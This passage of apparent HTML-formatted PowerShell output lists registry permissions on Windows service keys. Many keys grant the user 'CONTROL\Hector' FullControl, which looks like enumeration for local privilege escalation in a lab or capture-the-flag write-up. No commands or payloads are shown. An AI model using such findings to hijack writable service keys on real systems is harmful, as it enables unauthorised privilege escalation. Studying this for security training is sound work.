Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cdfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cdfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : CDPUserSvc</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : CDPUserSvc_42246</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : CDPUserSvc_4248c</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : CDPUserSvc_80d08</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : CDPUserSvc_ee306</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CDPUserSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cdrom</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cdrom</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CertPropSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CertPropSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cht4iscsi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cht4iscsi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cht4vbd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cht4vbd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CldFlt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CldFlt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CLFS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CLFS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ClipSVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ClipSVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\clr_optimization_v4.0.30319_32</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\clr_optimization_v4.0.30319_32</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\clr_optimization_v4.0.30319_64</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\clr_optimization_v4.0.30319_64</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CmBatt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CmBatt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CNG</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CNG</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cnghwassist</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cnghwassist</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\coherence</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\coherence</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  SetValue, CreateSubKey, Delete, ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -1073676288</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CompositeBus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CompositeBus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\COMSysApp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\COMSysApp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\condrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\condrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : ConsentUxUserSvc</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : ConsentUxUserSvc_42246</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : ConsentUxUserSvc_4248c</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : ConsentUxUserSvc_80d08</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : ConsentUxUserSvc_ee306</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ConsentUxUserSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CoreMessagingRegistrar</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CoreMessagingRegistrar</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CoreUI</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CoreUI</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\crypt32</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\crypt32</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CryptSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CryptSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CSC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CSC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CscService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CscService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dam</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\dam</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DCLocator</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DCLocator</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DcomLaunch</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DcomLaunch</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\defragsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\defragsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DeviceAssociationService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DeviceAssociationService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DeviceInstall</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DeviceInstall</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicePickerUserSvc</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicePickerUserSvc_42246</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicePickerUserSvc_4248c</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicePickerUserSvc_80d08</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicePickerUserSvc_ee306</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicePickerUserSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicesFlowUserSvc</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicesFlowUserSvc_42246</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicesFlowUserSvc_4248c</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicesFlowUserSvc_80d08</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : DevicesFlowUserSvc_ee306</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\DevicesFlowUserSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : 